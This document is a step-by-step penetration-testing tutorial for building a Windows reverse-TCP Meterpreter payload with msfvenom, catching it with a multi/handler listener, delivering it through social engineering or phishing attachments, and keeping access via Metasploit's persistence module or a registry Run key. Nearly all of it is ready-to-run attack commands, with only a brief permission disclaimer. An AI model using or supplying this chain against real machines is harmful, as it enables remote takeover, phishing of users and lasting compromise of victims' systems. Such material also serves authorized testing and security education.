# Procedure to Create Payloads in Metasploit and Maintain Persistence

This guide will walk you through the process of creating payloads in Metasploit and maintaining persistence on a target machine. **Make sure you have explicit permission** before performing any penetration testing.

---

## Prerequisites

- Kali Linux or a similar penetration testing distribution.
- Metasploit Framework installed.
- A target machine with permission for testing.
- Basic knowledge of Metasploit and networking.

---

## Step 1: Create a Payload

1. Open a terminal on your Kali Linux machine.
2. Use `msfvenom` to create a reverse TCP Meterpreter payload:

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP_Address> LPORT=4444 -f exe -o payload.exe
   ```

- `LHOST=<Your_IP_Address>`: Replace this with your Kali Linux machine’s IP address. This is the IP address that the target machine will connect to once the payload is executed.
  
- `LPORT=4444`: The port number that Metasploit will listen on for incoming connections from the target machine.
  
- `-f exe`: Specifies the output format as `.exe` (for Windows). This creates an executable file that can be run on the target machine.
  
- `-o payload.exe`: The name of the output file. This is the executable file that will be created, which you will deliver to the target machine.

After running this command, the `payload.exe` file will be generated, and this is the file that will be delivered to the target system for execution.
## Step 2: Set Up the Listener in Metasploit
Launch the Metasploit console:

```bash
msfconsole
```
In Metasploit, use the multi/handler exploit to handle the incoming connection:
```bash
use exploit/multi/handler
```
Set the payload type to the one you created:

```bash
set payload windows/meterpreter/reverse_tcp
```
Set LHOST and LPORT to match the values used when generating the payload:

```bash
set LHOST <Your_IP_Address>
set LPORT 4444
```
Start the listener:
```bash
exploit
```
Metasploit will now be listening for a connection from the target machine.
## Step 3: Deliver the Payload to the Target
To execute the payload on the target machine, you need to deliver the payload.exe file. This can be done through methods such as:

- Social engineering (e.g., convincing the user to run the file).
- Exploiting an existing vulnerability to upload and execute the payload.
- Phishing emails or malicious attachments.
- Once the target executes the payload, a Meterpreter session will be opened on your attacking machine.
## Step 4: Maintain Persistence
Persistence ensures that you retain access to the target system even after a reboot or logoff.

### Option 1: Use the Persistence Module in Metasploit
1. Background the current Meterpreter session:
```bash
background
```
2. Use the persistence post-exploitation module:
```bash
use post/windows/manage/persistence
```
3. Set the session ID (replace <Session_ID> with the active session number):
```bash
set SESSION <Session_ID>
set LHOST <Your_IP_Address>
set LPORT 4444
```
4. Run the persistence script:
```bash
run
```
This will ensure that the payload runs every time the target machine reboots or a user logs in.
### Option 2: Manually Add Persistence Using the Windows Registry
You can also manually add persistence by modifying the Windows registry to automatically run the ``` payload```.

In the Meterpreter session, execute the following command:
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyPayload" /t REG_SZ /d "C:\path\to\payload.exe" /f
```
This will make sure the payload executes every time the user logs in to the system.
## Step 5: Verify Persistence
To verify persistence, reboot the target machine. After the system restarts, the payload should automatically execute and re-establish the Meterpreter session.
# Conclusion

In this guide, we have demonstrated the process of creating payloads using Metasploit and establishing persistence on a target machine. By using Metasploit's `msfvenom` tool, we created a reverse TCP payload, and through the use of the `multi/handler` exploit, we set up a listener to catch incoming connections from the payload. Additionally, we discussed methods for maintaining persistence using Metasploit's persistence module, ensuring continued access to the compromised system.

It's essential to use these techniques ethically and responsibly. Always have explicit permission from the system owner before conducting penetration tests. Unauthorized use of these tools can lead to legal consequences and violations of ethical standards.



